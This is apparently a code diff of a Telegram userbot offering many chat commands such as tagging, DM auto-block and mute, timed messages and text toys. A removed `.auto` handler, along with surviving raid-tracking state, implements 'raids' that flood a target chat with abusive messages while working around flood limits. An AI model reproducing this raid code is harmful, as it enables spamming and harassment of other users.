-            await event.edit("ℹ️ **DM target (`<t>` = user ID / `@username` / DM chat) dein.**")
-            return
-
-        if mode == "on":
-            dm_autopin_targets.add(target_uid)
-            await event.edit(f"📌 **DM AutoPin ON** ho gaya hai target `{target_uid}` ke liye.")
-        else:
-            dm_autopin_targets.discard(target_uid)
-            await event.edit(f"📍 **DM AutoPin OFF** ho gaya hai target `{target_uid}` ke liye.")
-
     @ubot.on(events.NewMessage(pattern=r'^\.tagall\b', outgoing=True))
     async def tagall_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group mein chalti hai.**")
-            return
         parts = event.raw_text.split(maxsplit=1)
-        extra = parts[1].strip() if len(parts) > 1 else "Attention!"
+        extra = parts[1].strip() if len(parts) > 1 else ""
         mentions = []
-        async for user in ubot.iter_participants(event.chat_id, limit=25):
-            if not user.bot and user.first_name:
-                mentions.append(f"[{user.first_name}](tg://user?id={user.id})")
+        async for user in ubot.iter_participants(event.chat_id, limit=40):
+            if not getattr(user, "bot", False):
+                name = getattr(user, "first_name", "User") or "User"
+                mentions.append(f"[{name}](tg://user?id={user.id})")
         if not mentions:
-            await event.edit("ℹ️ **Koi member tag karne ke liye nahi mila.**")
+            await event.edit("ℹ️ **Koi member nahi mila.**")
             return
-        await event.edit(f"📣 **{extra}**\n" + " • ".join(mentions))
+        await event.edit(f"📣 **TAG ALL** {extra}\n" + " ".join(mentions))
 
     @ubot.on(events.NewMessage(pattern=r'^\.admins$', outgoing=True))
     async def admins_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group mein chalti hai.**")
-            return
-        adm_list = []
-        async for user in ubot.iter_participants(event.chat_id, filter=ChannelParticipantsAdmins):
-            name = user.first_name or "Admin"
-            adm_list.append(f"👑 [{name}](tg://user?id={user.id})")
-        await event.edit("🛡️ **Group Admins**\n" + ("\n".join(adm_list) if adm_list else "Koi admin list nahi mili."))
+        lines = ["👮 **Admins:**"]
+        async for u in ubot.iter_participants(event.chat_id, filter=ChannelParticipantsAdmins):
+            lines.append(f"• `{u.id}` — **{getattr(u, 'first_name', 'Admin')}**")
+        await event.edit("\n".join(lines))
 
     @ubot.on(events.NewMessage(pattern=r'^\.bots$', outgoing=True))
     async def bots_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group mein chalti hai.**")
+        lines = ["🤖 **Bots:**"]
+        async for u in ubot.iter_participants(event.chat_id, filter=ChannelParticipantsBots):
+            lines.append(f"• `{u.id}` — **@{getattr(u, 'username', 'bot')}**")
+        await event.edit("\n".join(lines))
+
+    @ubot.on(events.NewMessage(pattern=r'^\.pingall$', outgoing=True))
+    async def pingall_cmd(event):
+        mentions = []
+        async for user in ubot.iter_participants(event.chat_id, limit=25):
+            if not getattr(user, "bot", False):
+                mentions.append(f"[⚡](tg://user?id={user.id})")
+        if not mentions:
+            await event.edit("ℹ️ **Koi member nahi mila.**")
             return
-        bot_list = []
-        async for b in ubot.iter_participants(event.chat_id, filter=ChannelParticipantsBots):
-            uname = f"@{b.username}" if getattr(b, "username", None) else str(b.id)
-            bot_list.append(f"🤖 `{b.first_name or 'Bot'}` ({uname})")
-        await event.edit("🤖 **Group Bots**\n" + ("\n".join(bot_list) if bot_list else "Koi bot nahi mila."))
+        await event.edit("🔔 **PING:** " + " ".join(mentions))
 
-    @ubot.on(events.NewMessage(pattern=r'^\.trim\b', outgoing=True))
-    async def trim_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.trim [text]`")
+    # 11. DM, REACT & CONTROL (.dmblock, .dmwelcome, .dmmute, .undmmute, .say30, .stop30, .stop, .stopall, .clear, .restart, .help)
+    @ubot.on(events.NewMessage(pattern=r'^\.dmblock\s+(on|off)$', outgoing=True))
+    async def dmblock_cmd(event):
+        mode = event.pattern_match.group(1).lower() == "on"
+        dm_block_enabled[owner_id] = mode
+        await event.edit(f"🛡️ **DM Auto-Block:** `{'ON' if mode else 'OFF'}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.dmwelcome\s+(on|off|reset)$', outgoing=True))
+    async def dmwelcome_cmd(event):
+        act = event.pattern_match.group(1).lower()
+        if act == "on":
+            dm_welcome_enabled[owner_id] = True
+            await event.edit("👋 **DM 1x Welcome:** `ON`")
+        elif act == "off":
+            dm_welcome_enabled[owner_id] = False
+            await event.edit("👋 **DM 1x Welcome:** `OFF`")
+        elif act == "reset":
+            dm_welcomed_users[owner_id] = set()
+            await event.edit("🔄 **DM 1x Welcome user list reset ho gayi.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.dmmute$', outgoing=True))
+    async def dmmute_cmd(event):
+        if not event.is_private:
+            await event.edit("ℹ️ **Kisi ke DM mein `.dmmute` likhein.**")
             return
-        await event.edit(" ".join(txt.split()))
+        dm_muted_users.setdefault(owner_id, set()).add(event.chat_id)
+        await event.edit("🔇 **Is DM user ke messages ab auto-delete honge.**")
 
-    @ubot.on(events.NewMessage(pattern=r'^\.caps\b', outgoing=True))
-    async def caps_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.caps [text]`")
+    @ubot.on(events.NewMessage(pattern=r'^\.undmmute$', outgoing=True))
+    async def undmmute_cmd(event):
+        if not event.is_private:
+            await event.edit("ℹ️ **Kisi ke DM mein `.undmmute` likhein.**")
             return
-        await event.edit(txt.upper())
+        dm_muted_users.setdefault(owner_id, set()).discard(event.chat_id)
+        await event.edit("🔊 **Is DM user ka mute hata diya gaya.**")
 
-    @ubot.on(events.NewMessage(pattern=r'^\.lower\b', outgoing=True))
-    async def lower_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.lower [text]`")
+    @ubot.on(events.NewMessage(incoming=True))
+    async def dm_incoming_handler(event):
+        if not event.is_private:
             return
-        await event.edit(txt.lower())
-
-    @ubot.on(events.NewMessage(pattern=r'^\.title\b', outgoing=True))
-    async def title_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.title [text]`")
-            return
-        await event.edit(txt.title())
-
-    @ubot.on(events.NewMessage(pattern=r'^\.coin$', outgoing=True))
-    async def coin_cmd(event):
-        await event.edit("🪙 `Coin toss ho raha hai...`")
-        await asyncio.sleep(0.35)
-        await event.edit(f"🪙 **Result:** `{random.choice(['HEADS', 'TAILS'])}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.rate\b', outgoing=True))
-    async def rate_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        topic = parts[1].strip() if len(parts) > 1 else "Yeh"
-        score = random.randint(1, 10)
-        stars = "⭐" * max(1, min(score // 2, 5))
-        await event.edit(f"🎯 **Rating for {topic}:** `{score}/10` {stars}")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.clear$', outgoing=True))
-    async def clear_states_cmd(event):
-        autopin_chats.discard(event.chat_id)
-        if event.is_private and event.chat_id:
-            dm_autopin_targets.discard(event.chat_id)
-        await event.edit(
-            "🧹 **Chat States Cleared**\n"
-            f"• **AutoPin Chats:** `{len(autopin_chats)}`\n"
-            f"• **DM AutoPin Targets:** `{len(dm_autopin_targets)}`"
-        )
-
-    # 15. SCREENSHOT COMMANDS (.purge, .timebio, .tts, .auto, .chup, .bol) + 10 EXTRA COMMANDS
-    @ubot.on(events.NewMessage(pattern=r'^\.purge\b', outgoing=True))
-    async def purge_cmd(event):
-        parts = event.raw_text.split()
-        limit = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20, 100))
-        msg_ids = []
-        if event.is_reply:
-            r = await event.get_reply_message()
-            async for m in ubot.iter_messages(event.chat_id, min_id=max(0, r.id - 1), max_id=event.id + 1, limit=limit):
-                msg_ids.append(m.id)
-        else:
-            async for m in ubot.iter_messages(event.chat_id, limit=limit):
-                msg_ids.append(m.id)
-        if not msg_ids:
-            await event.edit("ℹ️ **Saaf karne ke liye koi message nahi mila.**")
-            return
-        try:
-            await ubot.delete_messages(event.chat_id, msg_ids)
-        except Exception as e:
-            await event.edit(f"❌ **Purge nahi ho saka:** `{e}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.timebio\b', outgoing=True))
-    async def timebio_cmd(event):
-        parts = event.raw_text.split()
-        if len(parts) < 2 or parts[1].lower() not in ("on", "off"):
-            await event.edit("ℹ️ **Istemaal:** `.timebio on` ya `.timebio off`")
-            return
-        mode = parts[1].lower()
-        if mode == "off":
-            task = timebio_tasks.pop(owner_id, None)
-            if task:
-                task.cancel()
-            await event.edit("🛑 **TimeBio OFF ho gaya hai.**")
+        sender_id = event.sender_id
+        if not sender_id or sender_id == owner_id:
             return
 
-        old_task = timebio_tasks.pop(owner_id, None)
-        if old_task:
-            old_task.cancel()
-
-        async def _bio_loop():
-            try:
-                while True:
-                    now_str = datetime.now().strftime("%I:%M %p")
-                    bio_text = f"⚡ {BOT_BRAND} | 🕒 {now_str}"[:70]
-                    try:
-                        await ubot(UpdateProfileRequest(about=bio_text))
-                    except Exception:
-                        pass
-                    await asyncio.sleep(60)
-            except asyncio.CancelledError:
-                pass
-
-        timebio_tasks[owner_id] = asyncio.create_task(_bio_loop())
-        await event.edit("🕒 **Live Clock TimeBio ON ho gaya hai.**")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.tts\b', outgoing=True))
-    async def tts_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1].strip() if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.tts [text]`")
-            return
-        clean_txt = re.sub(r'[^\w\s\u0900-\u097F.,!?-]', '', txt).strip() or txt
-        try:
-            from gtts import gTTS
-            with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as tf:
-                mp3_path = tf.name
-            gTTS(text=clean_txt[:300], lang="hi").save(mp3_path)
-            await ubot.send_file(event.chat_id, mp3_path, voice_note=True, reply_to=event.reply_to_msg_id)
-            try:
-                os.remove(mp3_path)
-            except Exception:
-                pass
+        if sender_id in dm_muted_users.get(owner_id, set()):
             try:
                 await event.delete()
             except Exception:
                 pass
-        except ImportError:
-            await event.edit(f"🎙️ **TTS:** `{clean_txt}` *(gTTS install karein voice note ke liye)*")
-        except Exception as e:
-            await event.edit(f"❌ **TTS error:** `{e}`")
+            return
 
-    @ubot.on(events.NewMessage(pattern=r'^\.auto\b', outgoing=True))
-    async def auto_smart_link_cmd(event):
-        parts = event.raw_text.split()
-        target_chat = event.chat_id
-        reply_to = event.reply_to_msg_id
-        count = 15
-        for tok in parts[1:]:
-            if tok.isdigit():
-                count = max(1, min(int(tok), 200))
-            elif "t.me/" in tok:
-                if "/c/" in tok:
-                    m = re.search(r'/c/(\d+)/(\d+)', tok)
-                    if m:
-                        target_chat = int("-100" + m.group(1))
-                        reply_to = int(m.group(2))
-                else:
-                    m = re.search(r't\.me/([^/]+)(?:/(\d+))?', tok)
-                    if m:
-                        try:
-                            ent = await ubot.get_entity(m.group(1))
-                            target_chat = ent.id
-                            if m.group(2):
-                                reply_to = int(m.group(2))
-                        except Exception:
-                            pass
-            elif tok.startswith("@"):
+        if dm_block_enabled.get(owner_id, False):
+            try:
+                await ubot(BlockRequest(id=sender_id))
+                return
+            except Exception:
+                pass
+
+        if dm_welcome_enabled.get(owner_id, True):
+            welcomed = dm_welcomed_users.setdefault(owner_id, set())
+            if sender_id not in welcomed:
+                welcomed.add(sender_id)
                 try:
-                    ent = await ubot.get_entity(tok)
-                    target_chat = ent.id
+                    await event.reply("✦ 𝐇𝐄𝐘𝐘 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐃𝐌 ✦")
                 except Exception:
                     pass
 
-        if target_chat in active_raid_tasks:
-            active_raid_tasks[target_chat].cancel()
-        active_raids.add(target_chat)
+        if owner_id in afk_status:
+            try:
+                await event.reply(f"💤 **Main abhi AFK hoon.**\n📌 **Reason:** `{afk_status[owner_id]}`")
+            except Exception:
+                pass
+
+    async def _say30_loop(target_chat, text):
         try:
-            await event.delete()
-        except Exception:
+            while True:
+                await asyncio.sleep(1800)
+                try:
+                    await ubot.send_message(target_chat, text)
+                except FloodWaitError as f:
+                    await asyncio.sleep(f.seconds + 1)
+                except Exception:
+                    break
+        except asyncio.CancelledError:
             pass
 
-        async def _auto_worker():
-            try:
-                for _ in range(count):
-                    if target_chat not in active_raids:
-                        break
-                    try:
-                        await ubot.send_message(target_chat, random.choice(SINGLE_GAALIS), reply_to=reply_to)
-                    except FloodWaitError as f:
-                        await asyncio.sleep(f.seconds + 0.5)
-                    except Exception:
-                        break
-                    await asyncio.sleep(0.2)
-            finally:
-                active_raids.discard(target_chat)
-                active_raid_tasks.pop(target_chat, None)
-
-        active_raid_tasks[target_chat] = asyncio.create_task(_auto_worker())
-
-    @ubot.on(events.NewMessage(pattern=r'^\.chup$', outgoing=True))
-    async def chup_cmd(event):
-        if not event.is_reply:
-            await event.edit("ℹ️ **Kisi message par reply karke `.chup` likhein.**")
-            return
-        r = await event.get_reply_message()
-        if not r or not r.sender_id:
-            await event.edit("❌ **User ID nahi mil saki.**")
-            return
-        chup_muted_users.add(r.sender_id)
-        if event.is_group or event.is_channel:
-            try:
-                await ubot.edit_permissions(event.chat_id, r.sender_id, send_messages=False)
-            except Exception:
-                pass
-        await event.edit(f"🤐 **Chup kar diya gaya (`{r.sender_id}`). Unmute ke liye `.bol`.**")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.bol$', outgoing=True))
-    async def bol_cmd(event):
-        target_id = None
-        if event.is_reply:
-            r = await event.get_reply_message()
-            target_id = r.sender_id if r else None
-        if not target_id and chup_muted_users:
-            target_id = next(iter(chup_muted_users))
-        if not target_id:
-            await event.edit("ℹ️ **Unmute karne ke liye reply karein ya `.bol` chalayein.**")
-            return
-        chup_muted_users.discard(target_id)
-        if event.is_group or event.is_channel:
-            try:
-                await ubot.edit_permissions(event.chat_id, target_id, send_messages=True)
-            except Exception:
-                pass
-        await event.edit(f"🗣️ **Ab bol sakta hai (`{target_id}`) — Unmute ho gaya.**")
-
-    # 10 EXTRA COMMANDS
-    @ubot.on(events.NewMessage(pattern=r'^\.pingall$', outgoing=True))
-    async def pingall_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group mein chalti hai.**")
-            return
-        tags = []
-        async for u in ubot.iter_participants(event.chat_id, limit=20):
-            if not u.bot and u.first_name:
-                tags.append(f"[{u.first_name}](tg://user?id={u.id})")
-        await event.edit("🔔 " + (" • ".join(tags) if tags else "No users."))
-
-    @ubot.on(events.NewMessage(pattern=r'^\.alive2$', outgoing=True))
-    async def alive2_cmd(event):
-        await event.edit(f"⚡ **{BOT_BRAND} v2** | 👑 `{OWNER_NAME}` | ⏱️ `{format_uptime()}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.id2$', outgoing=True))
-    async def id2_cmd(event):
-        r = await event.get_reply_message() if event.is_reply else None
-        await event.edit(f"`Chat: {event.chat_id} | Msg: {event.id} | ReplyUser: {r.sender_id if r else 'None'}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.info2$', outgoing=True))
-    async def info2_cmd(event):
-        uid = (await event.get_reply_message()).sender_id if event.is_reply else event.sender_id
-        u = await ubot.get_entity(uid)
-        await event.edit(f"👤 `{getattr(u, 'first_name', '')}` (`{u.id}`)")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.whois2$', outgoing=True))
-    async def whois2_cmd(event):
-        uid = (await event.get_reply_message()).sender_id if event.is_reply else event.sender_id
-        u = await ubot.get_entity(uid)
-        await event.edit(f"🪪 ID: `{u.id}` | User: `@{u.username or 'N/A'}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.chatinfo2$', outgoing=True))
-    async def chatinfo2_cmd(event):
-        c = await event.get_chat()
-        await event.edit(f"💬 `{getattr(c, 'title', getattr(c, 'first_name', 'Chat'))}` (`{event.chat_id}`)")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.stats2$', outgoing=True))
-    async def stats2_cmd(event):
-        await event.edit(f"📈 Sessions: `{len(user_sessions)}` | Raids: `{len(active_raids)}` | Up: `{format_uptime()}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.calc2\b', outgoing=True))
-    async def calc2_cmd(event):
+    @ubot.on(events.NewMessage(pattern=r'^\.say30\b', outgoing=True))
+    async def say30_cmd(event):
         parts = event.raw_text.split(maxsplit=1)
-        if len(parts) < 2 or not re.fullmatch(r'[0-9+\-*/().%\s]+', parts[1]):
-            await event.edit("ℹ️ **Istemaal:** `.calc2 10+20`")
+        if len(parts) < 2 or not parts[1].strip():
+            await event.edit("ℹ️ **Istemaal:** `.say30 [text]`")
+            return
+        key = (owner_id, event.chat_id)
+        old = interval_30m_tasks.pop(key, None)
+        if old:
+            old.cancel()
+        interval_30m_tasks[key] = asyncio.create_task(_say30_loop(event.chat_id, parts[1].strip()))
+        await event.edit("⏰ **30-minute auto-message chalu ho gaya hai.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.stop30$', outgoing=True))
+    async def stop30_cmd(event):
+        key = (owner_id, event.chat_id)
+        t = interval_30m_tasks.pop(key, None)
+        if t:
+            t.cancel()
+            await event.edit("🛑 **30-minute auto-message band kar diya gaya.**")
+        else:
+            await event.edit("ℹ️ **Is chat mein `.say30` chalu nahi hai.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.stop$', outgoing=True))
+    async def stop_raid_cmd(event):
+        active_raids.discard(event.chat_id)
+        t = active_raid_tasks.pop(event.chat_id, None)
+        if t:
+            t.cancel()
+        await event.edit("🛑 **Is chat ke active raid/spam ruk gaye.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.stopall$', outgoing=True))
+    async def stopall_cmd(event):
+        active_raids.clear()
+        for t in list(active_raid_tasks.values()):
+            t.cancel()
+        active_raid_tasks.clear()
+        for t in list(interval_30m_tasks.values()):
+            t.cancel()
+        interval_30m_tasks.clear()
+        await event.edit("🛑 **Saare active raids aur 30m tasks band kar diye gaye.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.clear$', outgoing=True))
+    async def clear_states_cmd(event):
+        cid = event.chat_id
+        self_reacts.pop(cid, None)
+        user_react_targets.pop(cid, None)
+        all_reacts.pop(cid, None)
+        autopin_chats.discard(cid)
+        for item in [x for x in rraid_targets if x[0] == cid]:
+            rraid_targets.discard(item)
+        await event.edit("🧹 **Is chat ki saari active settings clear ho gayi.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.restart$', outgoing=True))
+    async def restart_ubot_cmd(event):
+        await event.edit("🔄 **Userbot session restart ho raha hai...**")
+        asyncio.create_task(start_userbot_session(session_string, owner_id))
+        await ubot.disconnect()
+
+    @ubot.on(events.NewMessage(pattern=r'^\.help$', outgoing=True))
+    async def ubot_help_cmd(event):
+        await event.edit(STATIC_COMMANDS_TEXT)
+
+    # 12. FUN, TEXT & UTILITY
+    @ubot.on(events.NewMessage(pattern=r'^\.roast$', outgoing=True))
+    async def roast_cmd(event):
+        await event.edit(f"🔥 {random.choice(ROAST_LINES)}")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.iq$', outgoing=True))
+    async def iq_cmd(event):
+        await event.edit(f"🧠 **IQ Level:** `{random.randint(40, 180)}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.love$', outgoing=True))
+    async def love_cmd(event):
+        await event.edit(f"❤️ **Love Meter:** `{random.randint(1, 100)}%`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(toss|coin)$', outgoing=True))
+    async def toss_cmd(event):
+        await event.edit(f"🪙 **Result:** **{random.choice(['HEADS', 'TAILS'])}**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.dice$', outgoing=True))
+    async def dice_cmd(event):
+        await event.edit(f"🎲 **Dice:** `{random.randint(1, 6)}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.rate\b', outgoing=True))
+    async def rate_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        topic = parts[1].strip() if len(parts) > 1 else "is cheez"
+        await event.edit(f"⭐ **{topic}** ko rating: **`{random.randint(1, 10)}/10`**")
+
+    def _safe_calc(expr):
+        allowed = set("0123456789+-*/().% ")
+        if not expr or any(c not in allowed for c in expr):
+            raise ValueError("Invalid characters")
+        return eval(expr, {"__builtins__": None}, {})
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(calc|calc2)\b', outgoing=True))
+    async def calc_cmd(event):
+        cmd = event.pattern_match.group(1)
+        parts = event.raw_text.split(maxsplit=1)
+        if len(parts) < 2:
+            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} 25*4`")
             return
         try:
-            await event.edit(f"🧮 `{eval(parts[1], {'__builtins__': None}, {})}`")
+            ans = _safe_calc(parts[1].strip())
+            await event.edit(f"🧮 **Result:** `{ans}`")
         except Exception:
-            await event.edit("❌ **Galat expression.**")
+            await event.edit("❌ **Expression galat hai.**")
 
-    @ubot.on(events.NewMessage(pattern=r'^\.mock2\b', outgoing=True))
-    async def mock2_cmd(event):
+    def _mock_str(s, alt=False):
+        out = []
+        for idx, ch in enumerate(s):
+            if alt:
+                out.append(ch.upper() if idx % 2 == 0 else ch.lower())
+            else:
+                out.append(ch.upper() if random.choice([True, False]) else ch.lower())
+        return "".join(out)
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(mock|mock2)\b', outgoing=True))
+    async def mock_cmd(event):
+        cmd = event.pattern_match.group(1)
         parts = event.raw_text.split(maxsplit=1)
-        src = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not src:
-            await event.edit("ℹ️ **Text dein ya reply karein.**")
+        txt = parts[1] if len(parts) > 1 else (await event.get_reply_message()).text if event.is_reply else ""
+        if not txt:
+            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [text]`")
             return
-        await event.edit("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(src)))
+        await event.edit(_mock_str(txt, alt=(cmd == "mock2")))
 
-    @ubot.on(events.NewMessage(pattern=r'^\.save2$', outgoing=True))
-    async def save2_cmd(event):
-        if not event.is_reply:
-            await event.edit("ℹ️ **Kisi message par reply karke `.save2` likhein.**")
+    @ubot.on(events.NewMessage(pattern=r'^\.reverse\b', outgoing=True))
+    async def reverse_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1] if len(parts) > 1 else (await event.get_reply_message()).text if event.is_reply else ""
+        await event.edit(txt[::-1] if txt else "ℹ️ **Text dein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.clap\b', outgoing=True))
+    async def clap_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1].strip() if len(parts) > 1 else ""
+        await event.edit(" 👏 ".join(txt.split()) if txt else "ℹ️ **Text dein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.vapor\b', outgoing=True))
+    async def vapor_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1] if len(parts) > 1 else ""
+        await event.edit(" ".join(list(txt)) if txt else "ℹ️ **Text dein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.trim\b', outgoing=True))
+    async def trim_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1].strip() if len(parts) > 1 else ""
+        await event.edit(re.sub(r"\s+", " ", txt) if txt else "ℹ️ **Text dein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.caps\b', outgoing=True))
+    async def caps_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1] if len(parts) > 1 else ""
+        await event.edit(txt.upper() if txt else "ℹ️ **Text dein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.lower\b', outgoing=True))
+    async def lower_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1] if len(parts) > 1 else ""
+        await event.edit(txt.lower() if txt else "ℹ️ **Text dein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.title\b', outgoing=True))
+    async def title_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1] if len(parts) > 1 else ""
+        await event.edit(txt.title() if txt else "ℹ️ **Text dein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.ship$', outgoing=True))
+    async def ship_cmd(event):
+        await event.edit(f"🚢 **Ship Compatibility:** `{random.randint(1, 100)}%` 💕")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.slap$', outgoing=True))
+    async def slap_cmd(event):
+        await event.edit("👋💥 *Thappad laga!*")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.hug$', outgoing=True))
+    async def hug_cmd(event):
+        await event.edit("🤗 *Ek tight hug!*")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.8ball\b', outgoing=True))
+    async def eightball_cmd(event):
+        ans = ["Haan bilkul.", "Bilkul nahi.", "Shayad.", "Baad mein poochho.", "100% pakka."]
+        await event.edit(f"🎱 {random.choice(ans)}")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.fact$', outgoing=True))
+    async def fact_cmd(event):
+        facts = [
+            "Honey kabhi kharab nahi hota.",
+            "Octopus ke teen dil hote hain.",
+            "Telegram bot API aur MTProto alag kaam karte hain."
+        ]
+        await event.edit(f"💡 **Fact:** {random.choice(facts)}")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.shayari$', outgoing=True))
+    async def shayari_cmd(event):
+        shayaris = [
+            "Khamoshi mein bhi apni ek baat hoti hai,\nMehfil mein bhi tanhai ka ehsaas hota hai.",
+            "Waqt badalta hai, par yaadein wahi rehti hain,\nKuch baatein dil ke kisi kone mein chhupi rehti hain."
+        ]
+        await event.edit(f"✍️ {random.choice(shayaris)}")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.tts\b', outgoing=True))
+    async def tts_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        txt = parts[1].strip() if len(parts) > 1 else ""
+        if not txt:
+            await event.edit("ℹ️ **Istemaal:** `.tts [text]`")
             return
-        r = await event.get_reply_message()
-        await ubot.send_message("me", r)
-        await event.edit("✅ **Saved Messages mein bhej diya gaya.**")
+        try:
+            from gtts import gTTS
+            with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as tf:
+                path = tf.name
+            gTTS(text=txt, lang="hi").save(path)
+            await ubot.send_file(event.chat_id, path, voice_note=True)
+            await event.delete()
+            os.remove(path)
+        except Exception:
+            await event.edit(f"🗣️ **TTS:** {txt}")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.ping$', outgoing=True))
+    async def ping_cmd(event):
+        t0 = time.time()
+        m = await event.edit("🏓 **Pinging...**")
+        ms = int((time.time() - t0) * 1000)
+        await m.edit(f"⚡ **{BOT_BRAND} Pong:** `{ms} ms`\n🕒 **Uptime:** `{format_uptime()}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(alive|alive2)$', outgoing=True))
+    async def alive_cmd(event):
+        cmd = event.pattern_match.group(1)
+        txt = (
+            f"⚡ **{BOT_BRAND} IS ALIVE** ⚡\n"
+            f"• **Owner:** `{OWNER_NAME}` (`{OWNER_ID}`)\n"
+            f"• **Uptime:** `{format_uptime()}`\n"
+            f"• **Mode:** `{'FULL V2' if cmd == 'alive2' else 'STANDARD'}`"
+        )
+        await event.edit(txt)
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(id|id2)$', outgoing=True))
+    async def id_cmd(event):
+        rep = await event.get_reply_message() if event.is_reply else None
+        target_uid = rep.sender_id if rep else event.sender_id
+        await event.edit(f"🆔 **User ID:** `{target_uid}`\n💬 **Chat ID:** `{event.chat_id}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(info|info2|whois|whois2)$', outgoing=True))
+    async def info_cmd(event):
+        rep = await event.get_reply_message() if event.is_reply else None
+        target = rep.sender if rep else await event.get_sender()
+        if not target:
+            await event.edit("❌ **User info nahi mil saki.**")
+            return
+        fname = getattr(target, "first_name", "") or "N/A"
+        lname = getattr(target, "last_name", "") or ""
+        uname = f"@{target.username}" if getattr(target, "username", None) else "None"
+        await event.edit(
+            f"👤 **User Info**\n"
+            f"• **Name:** `{(fname + ' ' + lname).strip()}`\n"
+            f"• **ID:** `{target.id}`\n"
+            f"• **Username:** `{uname}`"
+        )
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(chatinfo|chatinfo2)$', outgoing=True))
+    async def chatinfo_cmd(event):
+        chat = await event.get_chat()
+        title = getattr(chat, "title", None) or getattr(chat, "first_name", "Private Chat")
+        await event.edit(f"💬 **Chat:** `{title}`\n🆔 **Chat ID:** `{event.chat_id}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(stats|stats2)$', outgoing=True))
+    async def stats_cmd(event):
+        await event.edit(
+            f"📊 **{BOT_BRAND} Stats**\n"
+            f"• **Hosted Sessions:** `{len(user_sessions)}`\n"
+            f"• **Active Raids:** `{len(active_raids)}`\n"
+            f"• **Uptime:** `{format_uptime()}`"
+        )
+
+    @ubot.on(events.NewMessage(pattern=r'^\.time$', outgoing=True))
+    async def time_cmd(event):
